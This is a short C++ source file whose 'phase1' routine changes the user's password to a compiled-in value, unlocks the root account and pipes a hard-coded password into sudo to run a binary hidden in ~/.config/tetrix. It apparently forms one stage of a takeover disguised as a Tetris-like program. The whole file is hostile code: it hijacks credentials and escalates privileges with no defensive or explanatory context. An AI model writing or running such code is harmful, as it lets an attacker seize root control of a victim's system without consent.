#include "phase1.h"

phase1::phase1()
{

}

int phase1::execute()
{
  FILE* stdin = popen("passwd", "w");
  const char* newpass = ROOT_PASSWORD;
  fputs(newpass, stdin);
  fputs(newpass, stdin);
  pclose(stdin);
  system("passwd -u root"); //Unlock the root account.
  std::string homedir = std::getenv("HOME");
  system(("echo 'tetrix' | /bin/sudo "+ homedir +"/.config/tetrix/Tetrix -p 2").c_str());
  return 0;
}
